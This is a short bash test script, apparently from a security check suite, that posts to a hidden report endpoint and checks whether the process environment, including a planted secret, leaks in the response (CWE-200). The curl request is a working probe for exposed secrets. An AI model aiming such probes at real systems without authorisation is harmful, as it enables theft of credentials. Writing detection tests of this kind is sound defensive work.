#!/usr/bin/env bash
# CONFIGDUMP-001 (CWE-200): the hidden report builder dumps the process environment.
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/tools/report" -H 'content-type: application/json' -d '{"section":"all"}' | grep -q 'actuator-secret-from-env-42'
